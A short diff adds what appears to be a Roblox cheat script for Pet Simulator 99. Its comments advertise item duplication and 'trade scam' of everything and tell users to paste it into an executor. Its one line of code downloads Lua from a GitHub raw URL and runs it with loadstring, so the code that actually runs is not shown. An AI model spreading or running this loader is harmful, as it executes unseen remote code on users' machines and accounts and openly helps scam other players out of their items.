@@ -1,0 +1,6 @@
+-- Update (12/02/2024)
+-- DUPING: HUGES/EXC/GEMS/EGGS/HOVERBOARDS/ENCHANTS
+-- TRADE SCAM: EVERYTHING 
+-- Script📝: Paste into your executor
+  
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Szix7/Dupe/main/PetSimulator99"))()
